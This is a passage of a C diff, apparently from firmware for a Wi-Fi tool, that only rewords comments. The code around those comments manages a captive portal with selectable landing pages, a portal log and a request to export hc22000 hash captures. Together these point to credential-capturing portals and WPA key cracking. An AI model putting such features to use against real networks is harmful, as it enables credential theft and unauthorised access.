     if (idx < 0 || idx >= s_ap_cli_cnt[i]) {
         return false;
     }
@@ -5644,7 +5857,7 @@ const char *nocsif_wifi_ap_tag_str(void)
     return "off";
 }
 
-/* ---- captive portal requests + state (M5-P5·4, active) ----------------------------- */
+/* ---- captive portal requests and state (M5-P5.4, active) ---- */
 void     nocsif_wifi_request_portal(bool on) { post(on ? CMD_PORTAL_ON : CMD_PORTAL_OFF, NULL, NULL); }
 void     nocsif_wifi_companion_set(bool on)  { post(on ? CMD_COMPANION_ON : CMD_COMPANION_OFF, NULL, NULL); }
 void     nocsif_wifi_companion_set_cmd_handler(nocsif_companion_cmd_fn_t fn) { s_comp_cmd_fn = fn; }
@@ -5652,7 +5865,7 @@ void     nocsif_wifi_companion_set_menu_fn(nocsif_companion_json_fn_t fn)    { s
 void     nocsif_wifi_companion_set_state_fn(nocsif_companion_json_fn_t fn)   { s_comp_state_fn = fn; }
 void     nocsif_wifi_companion_set_touch_fn(nocsif_companion_touch_fn_t fn)  { s_comp_touch_fn = fn; }
 
-/* §4.15 desktop bridge — the same hooks over the USB console (no companion surface required). */
+/* section 4.15 desktop bridge: the same hooks, but over the USB console, with no companion surface required */
 bool nocsif_wifi_companion_dispatch(const nocsif_companion_cmd_t *cmd)
 {
     if (!s_comp_cmd_fn || !cmd) return false;
@@ -5705,7 +5918,7 @@ bool nocsif_wifi_portal_log_get(int idx, char *out, size_t len)
 {
     bool ok = false;
     portENTER_CRITICAL(&s_portal_mux);
-    if (idx >= 0 && idx < s_portal_log_cnt) {           /* idx 0 = newest */
+    if (idx >= 0 && idx < s_portal_log_cnt) {           /* idx 0 is the newest */
         int slot = (s_portal_log_head - 1 - idx + PORTAL_LOG_MAX * 2) % PORTAL_LOG_MAX;
         if (out && len) { snprintf(out, len, "%s", s_portal_log[slot]); }
         ok = true;
@@ -5728,15 +5941,17 @@ const char *nocsif_wifi_portal_tag_str(void)
     return "off";
 }
 
-/* The chosen landing-page filename ("" = the built-in notice). Module-owned; safe on the LVGL task. */
+/* The chosen landing-page filename; "" means the built-in notice. Module-owned, safe on the LVGL task. */
 const char *nocsif_wifi_portal_selected_page(void)
 {
     portal_sel_ensure_loaded();
     return s_portal_page_sel;
 }
 
-/* Select the landing page by filename (a name under /sd/nocsif/wifi/portals/, or "" for the built-in
- * notice). Cached + persisted; a running portal re-serves it at once. LVGL-task-safe. */
+/* Selects the landing page by filename — a name under
+ * /sd/nocsif/wifi/portals/, or "" for the built-in notice. Cached and
+ * persisted; a running portal re-serves it right away. Safe on the LVGL
+ * task. */
 void nocsif_wifi_portal_set_page(const char *name)
 {
     portal_sel_ensure_loaded();
@@ -5749,7 +5964,7 @@ void nocsif_wifi_portal_set_page(const char *name)
     if (s_portal_active) { post(CMD_PORTAL_RELOAD, NULL, NULL); }
 }
 
-/* ---- hc22000 export request + state (M5 passive polish) ---------------------------- */
+/* ---- hc22000 export request and state (M5 passive polish) ---- */
 void nocsif_wifi_request_export_hc22000(void) { post(CMD_EXPORT_HC, NULL, NULL); }
 const char *nocsif_wifi_hc_path(void)         { return s_hc_path; }
 
